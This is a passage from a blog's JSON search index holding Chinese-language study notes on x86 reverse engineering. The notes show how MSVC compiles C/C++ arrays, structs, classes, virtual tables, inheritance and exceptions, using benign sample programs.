","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"探测浮点标志位 int main(int argc, char* argv[]) { float f = 3.14f / argc; if (f == (float)argc) //ZF = 1 { printf(\"f == (float)argc\\r\\n\"); } else //ZF = 0 { printf(\"f != (float)argc\\r\\n\"); } if (f \u003e 1.23f) //SF = 0 and ZF = 0 { printf(\"f \u003e 1.23f\\r\\n\"); } else //SF = 1 or ZF = 1 { printf(\"f \u003c= 1.23f\\r\\n\"); } if (f \u003c 1.23f) //SF = 1 { printf(\"f \u003c 1.23f\\r\\n\"); } else { printf(\"f \u003e= 1.23f\\r\\n\"); } system(\"pause\"); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:4","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"参考资料 Intel奔腾指令速查手册.doc ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:5","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"多媒体指令集 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"MMX VS中使用MMX指令,包含头文件mmintrin.h 特征如下: 有8个64位寄存器(MM0~MM7),借用的是FPU原来的8个80位寄存器(st(0)~st(7)),故使用MMX指令后,需要加上一条EMMS指令,用以复位. 不再使用栈结构. 寄存器在拆分做独立运算时有两种模式. 支持并行计算. 指令 详细查看AMD开发手册(卷5). ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"SSE VS中使用SSE指令 xmmintrin.h //SSE emmintrin.h //SSE2 pmmintrin.h //SSE3 smmintrin.h //SSE4 特征如下: 有8个128位独立寄存器(XMM0~XMM7). 支持并行计算. 指令 详情查看AMD开发手册(卷4). 注意 movaps指令,要求内存地址为模16. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"AVX VS中使用AVX指令,包头文件immintrin.h 特征如下: 扩展之前的8个128位寄存器为8个256位寄存器(YMM0~YMM7). 支持并行计算. 指令 相对于SSE指令语法,前缀加v即可. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"VS中设置多媒体指令集 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:4","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"数组 特性: 连续性:数组内元素连续排列,且互相不会覆盖. 一致性:具备同类业务功能,即类型和业务功能一样. 注意:身高,体重,年龄都是int类型,但数据功能代表的不一样,这种不属于数组,属于结构体. 体现数组特性: 变量下标访问. 循环访问元素. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"一维数组 int main(int argc, char* argv[]) { int ary[5] = { 0, 1, 2, 3, 4 }; for (int i = 0; i \u003c 5; i++) { printf(\"%d\\r\\n\", ary[i]); } system(\"pause\"); return 0; } Debug Release 高版本(VS2015)Release 数组寻址公式 假设数组为ary[n] ary[x]寻址: 数组首地址 + x * sizeof(type) ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"二维数组 int main(int argc, char* argv[]) { int ary[3][5] = { { 1, 2, 3, 4, 5 }, { 10, 20, 30, 40, 50 }, { 100, 200, 300, 400, 500 } }; int x = 0; int y = 0; scanf(\"%d%d\", \u0026x, \u0026y); printf(\"%d\\r\\n\", ary[x][y]); system(\"pause\"); return 0; } Debug Release 数组寻址公式 假设数组为ary[M][N] ary[x][y]寻址 Debug版:ary + x * sizeof(type[N]) + y * sizeof(type) Release版:ary + (x * N + y) * sizeof(type) ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"三维数组 int main(int argc, char* argv[]) { int ary[2][3][5] = { { { 1, 2, 3, 4, 5 }, { 10, 20, 30, 40, 50 }, { 100, 200, 300, 400, 500 } }, { { 1, 2, 3, 4, 5 }, { 10, 20, 30, 40, 50 }, { 100, 200, 300, 400, 500 } } }; int x = 0; int y = 0; int z = 0; scanf(\"%d%d%d\", \u0026x, \u0026y, \u0026z); printf(\"%d\\r\\n\", ary[x][y][z]); system(\"pause\"); return 0; } Debug Release 数组寻址公式 假设数组为ary[M][N][K] ar[x][y][z]寻址 Debug版:ary + x * sizeof(type[N][K]) + y * sizeof(type[K]) + z * sizeof(type) Release版:ary + ((x * N + y) * K + z) * sizeof(type) ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"结构体 struct tagTest { char szName[5]; // + 0 int n; // + 8 double dbl; // + 16 short int w; // + 24 float f; // + 28 }; // sizeof 32 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"指针访问结构体成员 int main(int argc, char* argv[]) { tagTest t = { \"Luo\", 1234, 3.14, 12, 0.618f }; tagTest* p = \u0026t; printf(\"%d\\r\\n\", p-\u003en); system(\"pause\"); return 0; } Debug 特征 会出现寄存器相对间接寻址 出现这种情形,只能是数组常量下标访问或结构成员访问 识别的关键在于论证其中的元素是否具备存储连续性,以及作用是否一致 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"参数为结构体变量 void foo(struct tagTest t) { printf(\"%d\\r\\n\", t.n); } int main(int argc, char* argv[]) { tagTest t = { \"Luo\", 1234, 3.14, 12, 0.618f }; foo(t); system(\"pause\"); return 0; } Debug 高版本(VS2019) 会使用多媒体指令集完成,如果结构体足够大,就会使用内联memcpy分方式拷贝到栈上. 特征 会将结构体内容拷贝到栈上 关键语句:mov edi, esp 其实相当于一个内联的memcpy(esp, addr, size) ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"参数为结构体指针 void foo(struct tagTest* pt) { printf(\"%d\\r\\n\", pt-\u003en); } int main(int argc, char* argv[]) { tagTest t = { \"Luo\", 1234, 3.14, 12, 0.618f }; foo(\u0026t); system(\"pause\"); return 0; } Debug 特征 访问的时候,会出现寄存器相对间接寻址. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"函数返回值为结构体 tagTest foo() { tagTest t = { \"Luo\", 1234, 3.14, 12, 0.618f }; return t; } int main(int argc, char* argv[]) { tagTest t2 = foo(); system(\"pause\"); return 0; } Debug 返回值给临时变量,因为我们有可能会访问返回值,如foo().n 特征 多一个参数返回结构体地址 函数退出时,以参数为目标做memcpy复制结构体内容 函数的返回值为参数1 还原 我们按照汇编代码还原,可还原成以下结构 tagTest* GetObj(tagTest* p) { ... ... ... memcpy(p, xxx, xxx); return p; } 此时等价于 tagTest GetObj(); ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:4","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之变量相关 class CLuoTest { public: CLuoTest(); ~CLuoTest(); int IAdd(); void SetVal(int nVal1, int nVal2); private: int m_nVal1; int m_nVal2; }; CLuoTest::CLuoTest() { m_nVal1 = 10; m_nVal2 = 20; }; CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; int CLuoTest::IAdd() { return m_nVal1 + m_nVal2; }; void CLuoTest::SetVal(int nVal1, int nVal2) { m_nVal1 = nVal1; m_nVal2 = nVal2; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:11:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"类对象为局部变量 int main(int argc, char* argv[]) { CLuoTest LuoTest; LuoTest.SetVal(1, 2); int nSum = LuoTest.IAdd(); printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } 识别成员函数 Release 特征 ①第一参数为this指针,默认使用ecx传参. ②函数内对第一参数this指针做间接访问. 注意:如果成员函数为_cdecl或_stdcall调用约定,this指针通过栈传送且为第一参数. 识别构造函数 Release 特征 必要条件: ①必为thiscall调用约定. ②构造函数是该对象进入作用域后的第一次成员函数调用. ③返回this指针. 识别析构函数 Release 特征 必要条件: ①必为thiscall调用约定. ②析构函数是该对象进入作用域后的最后一次成员函数调用. ③无返回值定义. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:11:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"类对象为全局变量 CLuoTest g_LuoTest; int main(int argc, char* argv[]) { g_LuoTest.SetVal(1, 2); int nSum = g_LuoTest.IAdd(); printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } 构造函数和析构函数: 在__cinit函数的第二个__initterm函数中调用. Release Main函数执行完,会执行atexit注册的函数. 构造函数 析构函数 Debug 在__initterm的函数指针调用. 构造函数 析构函数 总结 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:11:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"类对象为堆变量 New单个对象 int main(int argc, char* argv[]) { CLuoTest* pLuoTest = new CLuoTest; pLuoTest-\u003eSetVal(1, 2); int nSum = pLuoTest-\u003eIAdd(); printf(\"%d\\r\\n\", nSum); delete pLuoTest; system(\"pause\"); return 0; } Release new delete 注意 new和delete函数会自动检查指针是否为空. 但我们仍然需要自己检查指针是否为空. 因为编译器做的检查,是为了是否执行构造函数或析构函数. 而我们做的检查,是为了让我们在别的地方使用这个指针的时候,指针不为空. Debug new delete 之所以会出现上述代码,是因为我们有可能写出如下代码. int main(int argc, char* argv[]) { CLuoTest* pLuoTest = new CLuoTest; pLuoTest-\u003eSetVal(1, 2); int nSum = pLuoTest-\u003eIAdd(); printf(\"%d\\r\\n\", nSum); pLuoTest-\u003e~CLuoTest(); //人工调析构,反复利用同一个空间 pLuoTest-\u003eCLuoTest::CLuoTest(); pLuoTest-\u003eSetVal(10, 20); nSum = pLuoTest-\u003eIAdd(); printf(\"%d\\r\\n\", nSum); delete pLuoTest; system(\"pause\"); return 0; } 此时push的参数就会是0,只执行析构函数,不释放空间. New对象数组 int main(int argc, char* argv[]) { CLuoTest* pLuoTest = new CLuoTest[5]; pLuoTest-\u003eSetVal(1, 2); int nSum = pLuoTest-\u003eIAdd(); printf(\"%d\\r\\n\", nSum); delete[] pLuoTest; system(\"pause\"); return 0; } Debug new 这个地方需要析构函数是因为,遇到new失败时,虽然前面的new成功,,但也算整个new对象数组的失败,需要把前面成功new的对象析构掉. detete[] ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:11:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之对象相关 class CLuoTest { public: CLuoTest(); ~CLuoTest(); void Show(); void SetVal(int nVal1, int nVal2); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoTest::CLuoTest() { m_nVal1 = 10; m_nVal2 = 20; strcpy(m_szName, \"Luo\"); printf(\"CLuoTest::CLuoTest\\r\\n\"); }; CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; void CLuoTest::Show() { printf(\"%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); }; void CLuoTest::SetVal(int nVal1, int nVal2) { m_nVal1 = nVal1; m_nVal2 = nVal2; strcpy(m_szName, \"Hun\"); } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"对象传参 void foo(CLuoTest LuoTest) { LuoTest.Show(); } 无拷贝构造 int main(int argc, char* argv[]) { CLuoTest LuoTest; LuoTest.SetVal(10, 20); foo(LuoTest); system(\"pause\"); return 0; } Release 特征 以栈顶为Dst,对象地址为Src,执行memcpy,浅拷贝. 有拷贝构造 /* //拷贝构造 CLuoTest::CLuoTest(CLuoTest\u0026 Obj) { m_nVal1 = Obj.m_nVal1; m_nVal2 = Obj. m_nVal2; strncpy(m_szName, Obj. m_szName, 20); } */ int main(int argc, char* argv[]) { CLuoTest LuoTest; LuoTest.SetVal(10, 20); foo(LuoTest); system(\"pause\"); return 0; } Debug Release 特征 ①将栈顶作为this指针给ecx,调用拷贝构造 关键语句:mov ecx, esp ②函数外调用构造函数,函数内调用析构函数 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"对象返回 CLuoTest GetObj() { CLuoTest LuoTest; LuoTest.SetVal(10, 20); return LuoTest; } 拷贝构造 /* //拷贝构造 CLuoTest::CLuoTest(CLuoTest\u0026 obj) { m_nVal1 = obj.m_nVal1; m_nVal2 = obj. m_nVal2; strncpy(m_szName, obj. m_szName, 20); } */ int main(int argc, char* argv[]) { CLuoTest HunTest = GetObj(); //拷贝构造 HunTest.Show(); system(\"pause\"); return 0; } Debug 浅拷贝 int main(int argc, char* argv[]) { CLuoTest HunTest; HunTest = GetObj(); //浅拷贝,产生临时对象 HunTest.Show(); system(\"pause\"); return 0; } Debug 特征 ①调用函数结束后,会执行以返回值为Src,目标对象为Dst的memcpy. ②临时对象,即多传进去的那个参数会执行析构. 无名对象 int main(int argc, char* argv[]) { CLuoTest\u0026 Ref = GetObj(); //产生无名对象,遇到分号不析构,生命周期随Ref Ref.Show(); system(\"pause\"); return 0; } Debug 将返回值给引用. 特征 ①函数多了一个参数. ②函数内构造,函数外析构. ③返回参数1. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"运算符重载 /* //运算符重载 //类内声明为友元函数 friend CLuoTest\u0026 operator+(CLuoTest\u0026 ObjDst, CLuoTest\u0026 ObjSrc); CLuoTest\u0026 operator+(CLuoTest\u0026 ObjDst, CLuoTest\u0026 ObjSrc) { ObjDst.m_nVal1 += ObjSrc.m_nVal1; ObjDst.m_nVal2 += ObjSrc.m_nVal2; return ObjDst; } */ int main(int argc, char* argv[]) { CLuoTest LuoTest; LuoTest.SetVal(10, 20); CLuoTest HunTest; LuoTest = LuoTest + HunTest; //中缀式,实际调用方式为波兰式 LuoTest = operator+(LuoTest, HunTest); LuoTest.Show(); system(\"pause\"); return 0; } Release ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"静态局部 int main(int argc, char* argv[]) { static CLuoTest LuoTest; LuoTest.Show(); system(\"pause\"); return 0; } Release 特征 ①用一个标记来记录静态局部对象是否已初始化. ②若未初始化,则执行构造函数,并注册析构代理. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:4","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之单重继承 class CLuoTest { public: CLuoTest(); CLuoTest::CLuoTest(CLuoTest\u0026 Obj); virtual ~CLuoTest(); virtual void Show(); void SetVal(int nVal1, int nVal2); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoTest::CLuoTest() { m_nVal1 = 10; m_nVal2 = 20; strcpy(m_szName, \"Luo\"); printf(\"CLuoTest::CLuoTest\\r\\n\"); }; CLuoTest::CLuoTest(CLuoTest\u0026 Obj) { m_nVal1 = Obj.m_nVal1; m_nVal2 = Obj.m_nVal2; strncpy(m_szName, Obj.m_szName, 20); } CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; void CLuoTest::Show() { printf(\"CLuoTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); }; void CLuoTest::SetVal(int nVal1, int nVal2) { m_nVal1 = nVal1; m_nVal2 = nVal2; strcpy(m_szName, \"Hun\"); } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:13:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"虚函数 只有使用对象的指针或引用调用虚函数时,才有访问虚表,间接调用的动作. int main(int argc, char* argv[]) { CLuoTest LuoObj; LuoObj.Show(); CLuoTest\u0026 HunObj = LuoObj; HunObj.Show(); system(\"pause\"); return 0; } 调用方式 Debug 特征 访问虚表,间接调用虚函数. 构造函数 Debug 特征 构造函数会填写虚表,这个地址在只读数据区. 注意:虚表中的函数指针不是0结尾,需通过实际调用,来判断虚函数. 初始化列表 CLuoTest::CLuoTest() :m_nVal1(10), m_nVal2(20) { strcpy(m_szName, \"Luo\"); printf(\"CLuoTest::CLuoTest\\r\\n\"); } Debug 析构函数 Debug 特征 析构函数会回填虚表地址. 注意 为什么析构函数会填写虚表? 假设有类A和类B. B继承A,构造时填写的是B的虚表. 而当B析构完,还需要析构A,但此时this指针中的虚表填写的是B的虚表. 如果此时我们通过虚表间接访问,就会访问到B的函数,但是B已经析构完了. 故需要在析构的时候回填虚表. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:13:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"单重继承有虚函数 class CHunTest : public CLuoTest { public: CHunTest(); virtual ~CHunTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CHunTest::CHunTest() { m_nVal1 = 100; m_nVal2 = 200; strcpy(m_szName, \"Hun\"); printf(\"CHunTest::CHunTest\\r\\n\"); } CHunTest::~CHunTest() { printf(\"CHunTest::~CHunTest\\r\\n\"); } void CHunTest::Show() { printf(\"CHunTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } 构造函数 int main(int argc, char* argv[]) { CLuoTest* pLuoObj = new CHunTest; pLuoObj-\u003eShow(); delete pLuoObj; system(\"pause\"); return 0; } Debug 虚表内容 技巧之交叉引用 查看虚表引用 int main(int argc, char* argv[]) { CLuoTest* pLuoObj = new CHunTest; pLuoObj-\u003eShow(); delete pLuoObj; system(\"pause\"); return 0; } 找到构造函数,识别出虚表地址 右键Xrefs graph to 从这张图中,我们就可以知道构造函数和析构函数. 查看构造函数引用 CHunTest g_HunObj; int main(int argc, char* argv[]) { CHunTest HunObj1; CHunTest HunObj2; CHunTest HunObj3; system(\"pause\"); return 0; } 查看父类构造函数引用 class CHunTest1 : public CLuoTest { }; class CHunTest2 : public CLuoTest { }; class CHunTest3 : public CLuoTest { }; int main(int argc, char* argv[]) { CHunTest HunObj; CHunTest1 HunObj1; CHunTest2 HunObj2; CHunTest3 HunObj3; system(\"pause\"); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:13:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之对象关系 继承: 特征 共用虚表,同一虚表位置写两次. 包含: 特征 不共用虚表,同一虚表位置写一次. 当红色对象析构时,紫色对象也不在了. 聚合: 特征 当红色对象析构时,紫色对象可在可不在. 注意 当无虚表时,继承和包含无法区分. 因为面向对象,是通过行为区分的,不是通过数据区分的. 虚表用来区分每个对象是什么. 数据用来区分同类型实体的差异. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:14:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之多重继承 class CLuoTest { public: CLuoTest(); virtual ~CLuoTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoTest::CLuoTest() { m_nVal1 = 10; m_nVal2 = 20; strcpy(m_szName, \"Luo\"); printf(\"CLuoTest::CLuoTest\\r\\n\"); }; CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; void CLuoTest::Show() { printf(\"CLuoTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } class CHunTest { public: CHunTest(); virtual ~CHunTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CHunTest::CHunTest() { m_nVal1 = 100; m_nVal2 = 200; strcpy(m_szName, \"Hun\"); printf(\"CHunTest::CHunTest\\r\\n\"); } CHunTest::~CHunTest() { printf(\"CHunTest::~CHunTest\\r\\n\"); } void CHunTest::Show() { printf(\"CHunTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } class CLuoHunTest : public CLuoTest, public CHunTest { public: CLuoHunTest(); virtual ~CLuoHunTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoHunTest::CLuoHunTest() { m_nVal1 = 1000; m_nVal2 = 2000; strcpy(m_szName, \"LuoHun\"); printf(\"CLuoHunTest::CLuoHunTest\\r\\n\"); } CLuoHunTest::~CLuoHunTest() { printf(\"CLuoHunTest::~CLuoHunTest\\r\\n\"); } void CLuoHunTest::Show() { printf(\"CLuoHunTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } 内存模型: CLuo和CHun的顺序,按继承时的书写顺序,从左到右. 构造函数: int main(int argc, char* argv[]) { CLuoHunTest* pObj = new CLuoHunTest; pObj-\u003eShow(); delete pObj; system(\"pause\"); return 0; } Debug 特征 先调父类构造,然后有几个父类,就填写几次虚表. 同类型指针转换: int main(int argc, char* argv[]) { CLuoHunTest LuoHunObj; CLuoTest* pLuoObj = \u0026LuoHunObj; CHunTest* pHunObj = \u0026LuoHunObj; //这个地方会产生一个分支 system(\"pause\"); return 0; } Debug 注意 为什么会产生一个分支? CLuoHunTest LuoHunObj; CLuoTest* pLuoObj = \u0026LuoHunObj; CHunTest* pHunObj = \u0026LuoHunObj;//这个地方会移动This指针,假如说\u0026LuoHunObj +0x10位置是CHunTest对象的位置,当\u0026LuoHunObj 不为NULL时,这样是正确的,但如果\u0026LuoHunObj为NULL,即下列代码,若无脑+0x10,结果就是错误的了 CLuoTest* pLuoObj = NULL; CHunTest* pHunObj = NULL; 纯虚函数识别: class CLuoTest { public: CLuoTest(); virtual ~CLuoTest(); virtual void Show() = 0; }; CLuoTest::CLuoTest() { }; CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; class CLuoHunTest : public CLuoTest { public: CLuoHunTest(); virtual ~CLuoHunTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoHunTest::CLuoHunTest() { m_nVal1 = 1000; m_nVal2 = 2000; strcpy(m_szName, \"LuoHun\"); printf(\"CLuoHunTest::CLuoHunTest\\r\\n\"); } CLuoHunTest::~CLuoHunTest() { printf(\"CLuoHunTest::~CLuoHunTest\\r\\n\"); } void CLuoHunTest::Show() { printf(\"CLuoHunTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } int main(int argc, char* argv[]) { CLuoHunTest LuoHunObj; LuoHunObj.Show(); system(\"pause\"); return 0; } 定位到父类虚表的第二项,纯虚函数项 Debug 特征 若强制调用纯虚函数,会出现一个错误. 因为虚表中,纯虚函数项填了一个提示错误信息,并关闭的函数指针即_purecall的函数指针. 注意 在构造函数或析构函数中调虚函数,不会触发多态. 因为构造函数或析构函数中会回填虚表,填自身对象的虚表地址. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:15:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之菱形结构 class CLuoA { public: virtual void TestA() {} virtual void TestCoverA() {} private: int m_nValA = 0xAAAAAAAA; }; class CLuoB : virtual public CLuoA { public: virtual void TestCoverA() {} virtual void TestB() {} private: int m_nValB = 0xBBBBBBBB; }; class CLuoD : virtual public CLuoA { public: virtual void TestCoverA() {} virtual void TestD() {} private: int m_nValD = 0xDDDDDDDD; }; class CLuoE :public CLuoB, public CLuoD { public: virtual void TestCoverA() {} virtual void TestCoverB() {} virtual void TestCoverD() {} virtual void TestE() {} private: int m_nValE = 0xEEEEEEEE; }; 内存模型: 构造函数: Debug 这个地方传1,表明需要填写偏移以及调祖先类构造函数. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:16:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"异常 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基本数据类型异常 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e void LuoTestException(int n) { switch (n) { case 0: { throw 1; break; } case 1: { throw 3.14f; break; } case 2: { throw 6.28; break; } case 3: { throw 'L'; break; } case 4: { bool bl = false; throw bl; break; } default: break; } } int main(int argc, char* argv[]) { int nVal = 0; scanf(\"%d\", \u0026nVal); try { LuoTestException(nVal); } catch (int n) { printf(\"catch int %d\\r\\n\", n); } catch (float f) { printf(\"catch float %f\\r\\n\", f); } catch (double dbl) { printf(\"catch double %lf\\r\\n\", dbl); } catch (char ch) { printf(\"catch char %c\\r\\n\", ch); } catch (bool b) { printf(\"catch bool 